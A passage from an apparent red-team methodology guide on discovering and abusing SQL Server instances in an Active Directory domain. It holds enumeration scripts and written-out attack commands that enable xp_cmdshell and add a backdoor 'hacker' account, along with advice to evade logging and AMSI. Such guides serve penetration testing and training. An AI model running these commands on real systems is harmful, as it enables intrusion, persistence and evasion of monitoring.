[Prev: 27_AD_CS_Enumeration.md](./27_AD_CS_Enumeration.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 29_LDAP_Injection.md](./29_LDAP_Injection.md)

# SQL Server Enumeration

> **⚠️ CRITICAL TOOL REQUIREMENT**: **Invisi-Shell** is mandatory for production environments to ensure stealth operations and avoid detection. See [Tool Arsenal](./01_Tool_Setup_Loading.md#-invisi-shell-complete-setup) for setup instructions.

## Overview
**SQL Server Enumeration** is a critical red team technique for discovering and analyzing **SQL Server instances** within an Active Directory environment.

### **What is SQL Server?**
**SQL Server** is Microsoft's relational database management system that:
- **Stores Data**: User accounts, passwords, configuration data
- **Manages Authentication**: Windows and SQL authentication
- **Provides Services**: Database services across the network
- **Enables Links**: Database links between different servers

### **Why SQL Server Matters for Red Teams**
SQL Server can be exploited for:
- **Command Execution**: Using `xp_cmdshell` for system commands
- **Lateral Movement**: Through database links and trust relationships
- **Data Theft**: Accessing sensitive database information
- **Privilege Escalation**: Using database service accounts
- **Persistence**: Long-term access through database connections

### **Key SQL Server Components**
- **Database Engine**: Core SQL Server service
- **SQL Server Agent**: Job scheduling and automation
- **Database Links**: Connections between different SQL instances
- **Extended Stored Procedures**: Like `xp_cmdshell` for command execution
- **Service Accounts**: Accounts running SQL Server services

## What SQL Server Enumeration Achieves
- **SQL Server Discovery**: Identify SQL Server instances across the domain
- **Database Link Analysis**: Understand database link configurations
- **Trust Abuse Opportunities**: Find database-based attack vectors
- **Lateral Movement Paths**: Identify database-based lateral movement
- **Infrastructure Mapping**: Map database services across the domain

## 📋 **QUICK START SQL SERVER DISCOVERY**

| Phase | Tool | Command | Purpose | OPSEC |
|------|------|---------|---------|------|
| 1 | Get-DomainComputer | `Get-DomainComputer -SPN \| ? {$_.servicePrincipalName -like "*MSSQL*"}` | SPN discovery | 🟢 |
| 2 | sqlcmd | `sqlcmd -S SQL01 -Q "SELECT @@VERSION"` | Instance probe | 🟢 |
| 3 | PowerUpSQL | `Get-SQLInstanceDomain` | Instance enumeration | 🟡 |
| 4 | Get-SQLServerLink | `Get-SQLServerLink -Instance SQL01` | Link discovery | 🟡 |
| 5 | xp_cmdshell | `EXEC xp_cmdshell 'whoami'` | Command exec test | 🟠 |

## 🎭 **AT-A-GLANCE: SQL SERVER ESSENTIALS**

**Reveals:** Instances, SPNs, database links, xp_cmdshell state, service accounts, trust relationships.

**Use Cases:** Lateral movement via links, command execution via xp_cmdshell, service account abuse, data exfiltration.

**Speed:** Stealth 3–6s jitter; Balanced 1–2s; Lab unrestricted.

## 🧭 **PIVOT MATRIX: STRATEGIC NEXT STEPS**

| Finding | Immediate Pivot | Goal | Tool/Technique |
|---------|-----------------|------|----------------|
| xp_cmdshell enabled | Command execution | OS foothold | xp_cmdshell, RAT |
| Trusted links present | Lateral movement | Network expansion | Database links, trust abuse |
| MSSQLSvc SPN users | Service account abuse | Credential theft | Kerberoasting, SPN abuse |
| SQL svc in admins | Rights abuse | Host compromise | ACL abuse, privilege escalation |

---

## 🛠️ **COMPREHENSIVE ENUMERATION TOOLS**

### 🔧 Microsoft‑Signed & Native
- `Get-ADComputer -Filter {servicePrincipalName -like "*MSSQL*"} -Properties *` — SPN discovery
- `sqlcmd -S SERVER -Q "SELECT @@VERSION"` — Instance probing
- `Get-Service -Name "*SQL*"` — Service enumeration
- `Test-NetConnection -ComputerName SERVER -Port 1433` — Port validation

### ⚔️ Offensive (PowerView/SharpView)
```powershell
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
Get-DomainUser -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
Get-DomainObject -LDAPFilter "(servicePrincipalName=*MSSQL*)" -Properties *
# Quick SPN filters
Get-DomainComputer -SPN | ? {$_.servicePrincipalName -match "MSSQLSvc|SQL"} | Select-Object name,servicePrincipalName
```

### 🔴 Red Team (SQL Server)
```cmd
Get-SQLInstanceDomain                                                           :: Domain instances
Get-SQLServerLink -Instance SQL01                                               :: Link enumeration
Get-SQLQuery -Instance SQL01 -Query "SELECT @@VERSION"                          :: Query execution
Invoke-SQLOSCmd -Instance SQL01 -Command "whoami"                              :: OS command exec
sqlmap -u "http://sql01:1433" --dbs                                            :: SQL injection
```

> **🔒 STEALTH REQUIREMENT**: **Invisi-Shell** must be loaded before any SQL Server enumeration in production environments to bypass logging and AMSI detection.

---

## Stealth & Loading
Use [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md) for stealth session and tool prep. Continue here with SQL‑specific discovery and abuse only.

## CyberCorp Persona
- Persona: Priya Rao, Data Platform Engineer. Objective: map SQL01/SQL02/SQL03, identify trusted links, verify xp_cmdshell state without enabling it in production.

## Lab vs Production
- Stealth: sample instances, read‑only queries, avoid enabling features, prefer metadata views; stagger probes.
- Lab: full link crawl and controlled xp_cmdshell enablement for validation.

## Detection (concise)
- Sudden xp_cmdshell enable events; unusual cross‑server queries (linked servers) and EXECUTE AS chains.

## Cleanup
```powershell
Remove-Variable sqlResults -ErrorAction SilentlyContinue
```

## 🗄️ SQL Server Infrastructure Visualization

```mermaid
flowchart TB
    subgraph "🏢 SQL Server Infrastructure"
        subgraph "🔍 Discovery Methods"
            SPN[🔍 SPN Discovery<br/>MSSQLSvc/*]
            PORT[🔌 Port Scanning<br/>1433, 1434]
            SERVICE[🛠️ Service Discovery<br/>SQL Server Services]
        end
        
        subgraph "💻 SQL Instances"
            INST1[💻 SQL01<br/>Instance: MSSQLSERVER<br/>Port: 1433]
            INST2[💻 SQL02<br/>Instance: SQLEXPRESS<br/>Port: 1434]
            INST3[💻 SQL03<br/>Instance: MSSQLSERVER<br/>Port: 1433]
        end
        
        subgraph "🔗 Database Links"
            LINK1[🔗 Link: SQL01->SQL02<br/>Trust: Windows Auth]
            LINK2[🔗 Link: SQL02->SQL03<br/>Trust: SQL Auth]
            LINK3[🔗 Link: SQL01->SQL03<br/>Trust: Windows Auth]
        end
        
        subgraph "⚔️ Attack Vectors"
            XPCMD[💥 xp_cmdshell<br/>Command Execution]
            LINKS[🔗 Database Links<br/>Lateral Movement]
            AUTH[🔐 Authentication<br/>Privilege Escalation]
        end
    end
    
    %% Connections
    SPN --> INST1
    PORT --> INST2
    SERVICE --> INST3
    
    INST1 --> LINK1
    INST2 --> LINK2
    INST3 --> LINK3
    
    LINK1 --> XPCMD
    LINK2 --> LINKS
    LINK3 --> AUTH
    
    %% Styling
    classDef discovery fill:#e3f2fd,stroke:#1565c0,stroke-width:2px
    classDef instance fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef link fill:#e8f5e8,stroke:#388e3c,stroke-width:2px
    classDef attack fill:#ffebee,stroke:#d32f2f,stroke-width:2px
    
    class SPN,PORT,SERVICE discovery
    class INST1,INST2,INST3 instance
    class LINK1,LINK2,LINK3 link
    class XPCMD,LINKS,AUTH attack
```



### **SQL Server Infrastructure Explanation**

This diagram shows the complete **SQL Server infrastructure** and attack vectors:

**🔍 Discovery Methods**: Multiple ways to find SQL Server instances
**💻 SQL Instances**: Different SQL Server instances with configurations
**🔗 Database Links**: Trust relationships between SQL instances
**⚔️ Attack Vectors**: How each component can be exploited

## SQL Server Enumeration Workflow

```mermaid
flowchart LR
    subgraph "🔍 Discovery Phase"
        A[🎯 Invisi-Shell Setup] --> B[🔍 SQL Server Discovery]
        B --> B1[🏗️ Instance Discovery]
        B --> B2[🔌 Port Discovery]
        B --> B3[🛠️ Service Discovery]
    end
    
    subgraph "📊 Analysis Phase"
        C[💻 Instance Analysis]
        C --> C1[📋 Instance Info]
        C --> C2[🔒 Security Config]
        C --> C3[🔗 Link Discovery]
    end
    
    subgraph "⚔️ Attack Phase"
        D[🎯 Attack Vector Analysis]
        D --> D1[💥 xp_cmdshell]
        D --> D2[🔗 Database Links]
        D --> D3[🔐 Authentication Abuse]
    end
    
    subgraph "🚀 Exploitation Phase"
        E[🔥 SQL Server Exploitation]
        E --> E1[💻 Command Execution]
        E --> E2[🌐 Lateral Movement]
        E --> E3[🔓 Privilege Escalation]
    end
    
    %% Flow
    A --> B --> C --> D --> E
    
    %% Styling
    classDef phase fill:#e3f2fd,stroke:#1565c0,stroke-width:3px
    classDef action fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px
    classDef analysis fill:#e8f5e8,stroke:#388e3c,stroke-width:2px
    classDef attack fill:#ffebee,stroke:#d32f2f,stroke-width:2px
    
    class A,B,C,D,E phase
    class B1,B2,B3,C1,C2,C3 action
    class D1,D2,D3 analysis
    class E1,E2,E3 attack
```



## SQL Server Enumeration Tools

### 1. Native Windows SQL Server Tools

#### **sqlcmd.exe** - SQL Server Command Line Tool
```cmd
# Connect to SQL Server instance
sqlcmd -S SERVER01.cybercorp.local -E

# Connect with specific database
sqlcmd -S SERVER01.cybercorp.local -d master -E

# Execute query
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT @@VERSION"

# List databases
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name FROM sys.databases"

# List linked servers
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, data_source FROM sys.servers"
```

**Tool Explanation:**
- **sqlcmd.exe**: Built-in Windows SQL Server command line tool
- **-S**: Specify server name/instance
- **-E**: Use Windows authentication
- **-d**: Specify database name
- **-Q**: Execute query and exit
- **Advantages**: Built into Windows, direct SQL Server access
- **Disadvantages**: May be logged, requires SQL Server access

#### **PowerShell SQL Server Provider**
```powershell
# Import SQL Server module
Import-Module SqlServer

# Connect to SQL Server
$connection = New-Object Microsoft.Data.SqlClient.SqlConnection
$connection.ConnectionString = "Server=SERVER01.cybercorp.local;Database=master;Integrated Security=true"
$connection.Open()

# Execute query
$command = New-Object Microsoft.Data.SqlClient.SqlCommand("SELECT @@VERSION", $connection)
$result = $command.ExecuteScalar()
Write-Host $result

# Close connection
$connection.Close()
```

**Tool Explanation:**
- **SqlServer Module**: PowerShell SQL Server provider
- **SqlConnection**: Create SQL Server connection
- **ConnectionString**: Connection string with server details
- **SqlCommand**: Execute SQL commands
- **Advantages**: Native PowerShell, programmatic access
- **Disadvantages**: Requires SqlServer module, may be logged

### 2. PowerShell SQL Server Tools

#### **PowerView - SQL Server SPN Enumeration**
```powershell
# Enumerate computers with SQL Server SPNs
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}

# Get SQL Server instances by SPN
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"} | ForEach-Object {
    $_.servicePrincipalName | Where-Object {$_ -like "*MSSQL*"}
}

# Enumerate SQL Server service accounts
Get-DomainUser -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
```

**Tool Explanation:**
- **Get-DomainComputer -SPN**: PowerView function to enumerate computers with SPNs
- **Where-Object**: Filter for SQL Server SPNs
- **servicePrincipalName**: SQL Server service principal names
- **MSSQL Pattern**: SQL Server SPN pattern matching
- **Advantages**: PowerView integration, comprehensive SPN data
- **Disadvantages**: Requires PowerView, may trigger logging

#### **Active Directory Module - SQL Server Queries**
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Get computers with SQL Server SPNs
Get-ADComputer -Filter {servicePrincipalName -like "*MSSQL*"} -Properties servicePrincipalName

# Get users with SQL Server SPNs
Get-ADUser -Filter {servicePrincipalName -like "*MSSQL*"} -Properties servicePrincipalName

# Search for SQL Server related objects
Get-ADObject -Filter {objectClass -eq "computer" -and servicePrincipalName -like "*MSSQL*"} -Properties *
```

**Tool Explanation:**
- **Get-ADComputer**: Native PowerShell AD computer query cmdlet
- **Get-ADUser**: Native PowerShell AD user query cmdlet
- **Get-ADObject**: Native PowerShell AD object query cmdlet
- **-Filter**: LDAP filter for SQL Server queries
- **-Properties**: Retrieve SPN properties
- **Advantages**: Native PowerShell, Microsoft supported, LDAP filter support
- **Disadvantages**: Requires AD module, may be logged

### 3. Third-Party SQL Server Tools

#### **PowerUpSQL - SQL Server Enumeration Tool**
```powershell
# PowerUpSQL SQL Server enumeration
Import-Module PowerUpSQL

# Get SQL Server instances in domain
Get-SQLInstanceDomain

# Get SQL Server instance information
Get-SQLInstanceDomain | Get-SQLServerInfo

# Test SQL Server connections
Get-SQLInstanceDomain | Get-SQLConnectionTest

# Test connections with threading
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded

# Get SQL Server information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Enumerate SQL Server links
Get-SQLInstanceDomain | Get-SQLServerLink

# Crawl SQL Server links
Get-SQLInstanceDomain | Get-SQLServerLinkCrawl
```

**Tool Explanation:**
- **PowerUpSQL**: Dedicated SQL Server enumeration and abuse tool
- **Get-SQLInstanceDomain**: Discover SQL Server instances in domain
- **Get-SQLServerInfo**: Get detailed SQL Server information
- **Get-SQLConnectionTest**: Test SQL Server connections
- **Get-SQLServerLink**: Enumerate linked servers
- **Get-SQLServerLinkCrawl**: Crawl linked server relationships
- **Advantages**: Dedicated SQL Server tool, comprehensive functionality
- **Disadvantages**: External tool, highly detectable

#### **PowerSploit - SQL Server Enumeration**
```powershell
# PowerSploit SQL Server enumeration
Import-Module PowerSploit

# SQL Server enumeration functions
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
```

**Tool Explanation:**
- **PowerSploit**: Offensive PowerShell framework
- **SQL Server Functions**: Dedicated SQL Server enumeration functions
- **SPN Analysis**: Analyze SPNs for SQL Server services
- **Advantages**: Offensive framework, comprehensive SQL Server functions
- **Disadvantages**: Requires PowerSploit, highly detectable

### 4. Custom SQL Server Enumeration Scripts

#### **Comprehensive SQL Server Enumeration Script**
```powershell
# Comprehensive SQL Server enumeration
function Invoke-ComprehensiveSQLServerEnumeration {
    param([string]$Domain = "cybercorp.local")
    
    try {
        Write-Host "Comprehensive SQL Server Enumeration for $Domain" -ForegroundColor Green
        Write-Host "=" * 60
        
        $sqlResults = @{
            Domain = $Domain
            SQLInstances = @()
            SQLServers = @()
            DatabaseLinks = @()
            VulnerableInstances = @()
            AttackVectors = @()
        }
        
        # Enumerate SQL Server instances
        Write-Host "Enumerating SQL Server instances..." -ForegroundColor Yellow
        try {
            if (Get-Command Get-SQLInstanceDomain -ErrorAction SilentlyContinue) {
                $instances = Get-SQLInstanceDomain
                
                foreach ($instance in $instances) {
                    $instanceInfo = @{
                        ComputerName = $instance.ComputerName
                        InstanceName = $instance.InstanceName
                        FullInstanceName = $instance.FullInstanceName
                        Port = $instance.Port
                        IsClustered = $instance.IsClustered
                        Version = $instance.Version
                        IsLocal = $instance.IsLocal
                    }
                    
                    $sqlResults.SQLInstances += $instanceInfo
                    
                    Write-Host "  Instance: $($instance.FullInstanceName)" -ForegroundColor Cyan
                    Write-Host "    Computer: $($instance.ComputerName)"
                    Write-Host "    Port: $($instance.Port)"
                    Write-Host "    Version: $($instance.Version)"
                    Write-Host "    Is Clustered: $($instance.IsClustered)"
                }
            } else {
                Write-Host "  PowerUpSQL not available, using alternative methods..." -ForegroundColor Yellow
                
                # Alternative enumeration using SPNs
                $sqlComputers = Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
                
                foreach ($computer in $sqlComputers) {
                    $sqlInstances = $computer.servicePrincipalName | Where-Object {$_ -like "*MSSQL*"}
                    
                    foreach ($spn in $sqlInstances) {
                        $instanceInfo = @{
                            ComputerName = $computer.Name
                            InstanceName = ($spn -split '/')[1]
                            FullInstanceName = "$($computer.Name)\$($spn -split '/')[1]"
                            Port = "1433" # Default SQL Server port
                            IsClustered = $false
                            Version = "Unknown"
                            IsLocal = $false
                        }
                        
                        $sqlResults.SQLInstances += $instanceInfo
                        
                        Write-Host "  Instance: $($instanceInfo.FullInstanceName)" -ForegroundColor Cyan
                        Write-Host "    Computer: $($instanceInfo.ComputerName)"
                        Write-Host "    Port: $($instanceInfo.Port)"
                        Write-Host "    Version: $($instanceInfo.Version)"
                    }
                }
            }
        }
        catch {
            Write-Host "  Failed to enumerate SQL Server instances: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Test SQL Server connections
        Write-Host "`nTesting SQL Server connections..." -ForegroundColor Yellow
        try {
            foreach ($instance in $sqlResults.SQLInstances) {
                Write-Host "  Testing connection to: $($instance.FullInstanceName)" -ForegroundColor Cyan
                
                try {
                    # Test connection using sqlcmd
                    $testResult = sqlcmd -S $instance.FullInstanceName -Q "SELECT @@VERSION" -h -1 -W -s"|" 2>$null
                    
                    if ($testResult) {
                        $instance.ConnectionStatus = "Success"
                        $instance.Version = ($testResult -split '|')[0].Trim()
                        $instance.IsAccessible = $true
                        
                        Write-Host "    Connection: SUCCESS" -ForegroundColor Green
                        Write-Host "    Version: $($instance.Version)"
                        
                        # Test for xp_cmdshell
                        try {
                            $cmdshellTest = sqlcmd -S $instance.FullInstanceName -Q "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'" -h -1 -W -s"|" 2>$null
                            
                            if ($cmdshellTest -and ($cmdshellTest -split '|')[0].Trim() -eq "1") {
                                $instance.xp_cmdshell = $true
                                Write-Host "    xp_cmdshell: ENABLED" -ForegroundColor Red
                            } else {
                                $instance.xp_cmdshell = $false
                                Write-Host "    xp_cmdshell: DISABLED"
                            }
                        }
                        catch {
                            $instance.xp_cmdshell = $false
                            Write-Host "    xp_cmdshell: UNKNOWN"
                        }
                        
                    } else {
                        $instance.ConnectionStatus = "Failed"
                        $instance.IsAccessible = $false
                        Write-Host "    Connection: FAILED" -ForegroundColor Red
                    }
                }
                catch {
                    $instance.ConnectionStatus = "Error"
                    $instance.IsAccessible = $false
                    Write-Host "    Connection: ERROR - $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }
        catch {
            Write-Host "  Failed to test SQL Server connections: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Enumerate database links
        Write-Host "`nEnumerating database links..." -ForegroundColor Yellow
        try {
            foreach ($instance in $sqlResults.SQLInstances | Where-Object {$_.IsAccessible -eq $true}) {
                Write-Host "  Enumerating links on: $($instance.FullInstanceName)" -ForegroundColor Cyan
                
                try {
                    $links = sqlcmd -S $instance.FullInstanceName -Q "SELECT name, data_source, is_linked FROM sys.servers WHERE is_linked = 1" -h -1 -W -s"|" 2>$null
                    
                    if ($links) {
                        foreach ($link in $links) {
                            $linkInfo = $link -split '\|'
                            if ($linkInfo.Count -ge 2) {
                                $dbLink = @{
                                    SourceInstance = $instance.FullInstanceName
                                    LinkName = $linkInfo[0].Trim()
                                    DataSource = $linkInfo[1].Trim()
                                    IsLinked = $true
                                }
                                
                                $sqlResults.DatabaseLinks += $dbLink
                                
                                Write-Host "    Link: $($dbLink.LinkName) -> $($dbLink.DataSource)" -ForegroundColor Green
                            }
                        }
                    } else {
                        Write-Host "    No database links found"
                    }
                }
                catch {
                    Write-Host "    Failed to enumerate links: $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }
        catch {
            Write-Host "  Failed to enumerate database links: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Analyze attack vectors
        Write-Host "`nAnalyzing attack vectors..." -ForegroundColor Yellow
        try {
            foreach ($instance in $sqlResults.SQLInstances) {
                $attackVector = @{
                    Instance = $instance.FullInstanceName
                    Vulnerabilities = @()
                    AttackType = ""
                    Difficulty = ""
                    Impact = ""
                }
                
                if ($instance.IsAccessible -eq $true) {
                    if ($instance.xp_cmdshell -eq $true) {
                        $attackVector.Vulnerabilities += "xp_cmdshell enabled"
                        $attackVector.AttackType = "Command Execution"
                        $attackVector.Difficulty = "Low"
                        $attackVector.Impact = "High - Direct command execution"
                    }
                    
                    if ($instance.DatabaseLinks.Count -gt 0) {
                        $attackVector.Vulnerabilities += "Database links present"
                        $attackVector.AttackType = "Trust Abuse"
                        $attackVector.Difficulty = "Medium"
                        $attackVector.Impact = "High - Lateral movement"
                    }
                    
                    if ($attackVector.Vulnerabilities.Count -gt 0) {
                        $sqlResults.VulnerableInstances += $instance
                        $sqlResults.AttackVectors += $attackVector
                        
                        Write-Host "  Attack Vector: $($instance.FullInstanceName)" -ForegroundColor Red
                        Write-Host "    Vulnerabilities: $($attackVector.Vulnerabilities -join ', ')"
                        Write-Host "    Attack Type: $($attackVector.AttackType)"
                        Write-Host "    Difficulty: $($attackVector.Difficulty)"
                        Write-Host "    Impact: $($attackVector.Impact)"
                    }
                }
            }
        }
        catch {
            Write-Host "  Failed to analyze attack vectors: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        # Display summary
        Write-Host "`nSQL Server Enumeration Summary:" -ForegroundColor Green
        Write-Host "  SQL Instances: $($sqlResults.SQLInstances.Count)"
        Write-Host "  Accessible Instances: $($sqlResults.SQLInstances | Where-Object {$_.IsAccessible -eq $true} | Measure-Object | Select-Object Count)"
        Write-Host "  Database Links: $($sqlResults.DatabaseLinks.Count)"
        Write-Host "  Vulnerable Instances: $($sqlResults.VulnerableInstances.Count)"
        Write-Host "  Attack Vectors: $($sqlResults.AttackVectors.Count)"
        
        if ($sqlResults.VulnerableInstances.Count -gt 0) {
            Write-Host "`n🔴 VULNERABLE INSTANCES FOUND:" -ForegroundColor Red
            foreach ($instance in $sqlResults.VulnerableInstances) {
                Write-Host "  $($instance.FullInstanceName)"
                if ($instance.xp_cmdshell -eq $true) {
                    Write-Host "    xp_cmdshell: ENABLED"
                }
                if ($instance.DatabaseLinks.Count -gt 0) {
                    Write-Host "    Database Links: $($instance.DatabaseLinks.Count)"
                }
            }
        }
        
        Write-Host "`nSQL Server Enumeration Complete!" -ForegroundColor Green
        return $sqlResults
        
    }
    catch {
        Write-Warning "Comprehensive SQL Server enumeration failed: $($_.Exception.Message)"
        return $null
    }
}

# Execute comprehensive SQL Server enumeration
$sqlResults = Invoke-ComprehensiveSQLServerEnumeration -Domain "cybercorp.local"
```

**Tool Explanation:**
- **Custom Function**: Tailored SQL Server enumeration for comprehensive analysis
- **Multiple Enumeration Methods**: Cover SPN discovery and direct connection testing
- **Connection Testing**: Test SQL Server accessibility and configurations
- **Database Link Discovery**: Enumerate linked server relationships
- **Vulnerability Analysis**: Analyze instances for security weaknesses
- **Advantages**: Comprehensive coverage, vulnerability analysis, attack planning
- **Disadvantages**: Custom code, may be complex

## SQL Server Analysis Techniques

### 1. Database Link Analysis

#### **Linked Server Security Assessment**
```powershell
# Assess linked server security
function Assess-LinkedServerSecurity {
    param([hashtable]$SQLResults)
    
    try {
        Write-Host "Assessing linked server security..." -ForegroundColor Yellow
        Write-Host "=" * 50
        
        $securityAssessment = @{
            CriticalVulnerabilities = @()
            HighVulnerabilities = @()
            MediumVulnerabilities = @()
            LowVulnerabilities = @()
            SecurityRecommendations = @()
        }
        
        # Analyze database links
        foreach ($link in $SQLResults.DatabaseLinks) {
            $vulnerabilities = @()
            $riskLevel = "Low"
            
            # Check for critical vulnerabilities
            if ($link.DataSource -like "*TRUSTED_CONNECTION*" -or $link.DataSource -like "*Integrated Security*") {
                $vulnerabilities += "Trusted connection enabled"
                $riskLevel = "Critical"
            }
            
            if ($link.DataSource -like "*sa*" -or $link.DataSource -like "*Administrator*") {
                $vulnerabilities += "High-privilege account used"
                $riskLevel = "High"
            }
            
            if ($link.DataSource -like "*localhost*" -or $link.DataSource -like "*127.0.0.1*") {
                $vulnerabilities += "Local loopback connection"
                $riskLevel = "Medium"
            }
            
            # Categorize vulnerabilities
            switch ($riskLevel) {
                "Critical" { $securityAssessment.CriticalVulnerabilities += @{ Link = $link.LinkName; Source = $link.SourceInstance; Vulnerabilities = $vulnerabilities } }
                "High" { $securityAssessment.HighVulnerabilities += @{ Link = $link.LinkName; Source = $link.SourceInstance; Vulnerabilities = $vulnerabilities } }
                "Medium" { $securityAssessment.MediumVulnerabilities += @{ Link = $link.LinkName; Source = $link.SourceInstance; Vulnerabilities = $vulnerabilities } }
                "Low" { $securityAssessment.LowVulnerabilities += @{ Link = $link.LinkName; Source = $link.SourceInstance; Vulnerabilities = $vulnerabilities } }
            }
            
            # Generate security recommendations
            if ($vulnerabilities.Count -gt 0) {
                $securityAssessment.SecurityRecommendations += "Review and secure database link: $($link.LinkName)"
                $securityAssessment.SecurityRecommendations += "  - Source: $($link.SourceInstance)"
                $securityAssessment.SecurityRecommendations += "  - Vulnerabilities: $($vulnerabilities -join ', ')"
                $securityAssessment.SecurityRecommendations += "  - Risk Level: $riskLevel"
            }
        }
        
        # Display security assessment
        Write-Host "Linked Server Security Assessment:" -ForegroundColor Green
        
        if ($securityAssessment.CriticalVulnerabilities.Count -gt 0) {
            Write-Host "`n🔴 CRITICAL VULNERABILITIES:" -ForegroundColor Red
            foreach ($vuln in $securityAssessment.CriticalVulnerabilities) {
                Write-Host "  Link: $($vuln.Link)"
                Write-Host "    Source: $($vuln.Source)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        if ($securityAssessment.HighVulnerabilities.Count -gt 0) {
            Write-Host "`n🟠 HIGH VULNERABILITIES:" -ForegroundColor DarkYellow
            foreach ($vuln in $securityAssessment.HighVulnerabilities) {
                Write-Host "  Link: $($vuln.Link)"
                Write-Host "    Source: $($vuln.Source)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        if ($securityAssessment.MediumVulnerabilities.Count -gt 0) {
            Write-Host "`n🟡 MEDIUM VULNERABILITIES:" -ForegroundColor Yellow
            foreach ($vuln in $securityAssessment.MediumVulnerabilities) {
                Write-Host "  Link: $($vuln.Link)"
                Write-Host "    Source: $($vuln.Source)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        if ($securityAssessment.LowVulnerabilities.Count -gt 0) {
            Write-Host "`n🟢 LOW VULNERABILITIES:" -ForegroundColor Green
            foreach ($vuln in $securityAssessment.LowVulnerabilities) {
                Write-Host "  Link: $($vuln.Link)"
                Write-Host "    Source: $($vuln.Source)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        # Display security recommendations
        if ($securityAssessment.SecurityRecommendations.Count -gt 0) {
            Write-Host "`nSecurity Recommendations:" -ForegroundColor Cyan
            foreach ($recommendation in $securityAssessment.SecurityRecommendations) {
                Write-Host "  $recommendation"
            }
        }
        
        return $securityAssessment
        
    }
    catch {
        Write-Warning "Linked server security assessment failed: $($_.Exception.Message)"
        return $null
    }
}

# Assess linked server security
$linkSecurity = Assess-LinkedServerSecurity -SQLResults $sqlResults
```

**Tool Explanation:**
- **Security Assessment**: Assess linked server security
- **Vulnerability Categorization**: Categorize vulnerabilities by risk level
- **Security Recommendations**: Generate security recommendations
- **Link Analysis**: Analyze database link configurations
- **Advantages**: Security insights, risk assessment, recommendations
- **Disadvantages**: Complex analysis, requires security knowledge

### 2. Attack Vector Analysis

#### **SQL Server Abuse Planning**
```powershell
# Plan SQL Server abuse attacks
function Plan-SQLServerAbuseAttacks {
    param([hashtable]$SQLResults)
    
    try {
        Write-Host "Planning SQL Server abuse attacks..." -ForegroundColor Yellow
        Write-Host "=" * 50
        
        $attackPlan = @{
            ImmediateAttacks = @()
            EscalationPaths = @()
            ToolRequirements = @()
            ExecutionSteps = @()
        }
        
        # Analyze vulnerable instances for immediate attacks
        foreach ($instance in $SQLResults.VulnerableInstances) {
            if ($instance.xp_cmdshell -eq $true) {
                $attackPlan.ImmediateAttacks += @{
                    Instance = $instance.FullInstanceName
                    AttackType = "xp_cmdshell Abuse"
                    Description = "Execute commands via xp_cmdshell"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($instance.FullInstanceName) -Q \"EXEC xp_cmdshell 'whoami'\""
                    Risk = "High - Direct command execution"
                }
            }
            
            if ($instance.DatabaseLinks.Count -gt 0) {
                $attackPlan.ImmediateAttacks += @{
                    Instance = $instance.FullInstanceName
                    AttackType = "Database Link Abuse"
                    Description = "Abuse database links for lateral movement"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($instance.FullInstanceName) -Q \"SELECT * FROM [LINK_NAME].[master].[sys].[servers]\""
                    Risk = "High - Lateral movement"
                }
            }
        }
        
        # Plan privilege escalation paths
        foreach ($attack in $attackPlan.ImmediateAttacks) {
            if ($attack.AttackType -eq "xp_cmdshell Abuse") {
                $attackPlan.EscalationPaths += @{
                    Step = 1
                    Action = "Enable xp_cmdshell if disabled"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($attack.Instance) -Q \"sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE\""
                    ExpectedResult = "xp_cmdshell enabled"
                }
                
                $attackPlan.EscalationPaths += @{
                    Step = 2
                    Action = "Execute reconnaissance commands"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($attack.Instance) -Q \"EXEC xp_cmdshell 'whoami /all'\""
                    ExpectedResult = "User and group information"
                }
                
                $attackPlan.EscalationPaths += @{
                    Step = 3
                    Action = "Execute privilege escalation commands"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($attack.Instance) -Q \"EXEC xp_cmdshell 'net user /add hacker Password123!'\""
                    ExpectedResult = "New user account created"
                }
            }
            
            if ($attack.AttackType -eq "Database Link Abuse") {
                $attackPlan.EscalationPaths += @{
                    Step = 1
                    Action = "Enumerate linked servers"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($attack.Instance) -Q \"SELECT name, data_source FROM sys.servers WHERE is_linked = 1\""
                    ExpectedResult = "List of linked servers"
                }
                
                $attackPlan.EscalationPaths += @{
                    Step = 2
                    Action = "Test linked server access"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($attack.Instance) -Q \"SELECT @@VERSION FROM [LINK_NAME].[master].[sys].[servers]\""
                    ExpectedResult = "Linked server version information"
                }
                
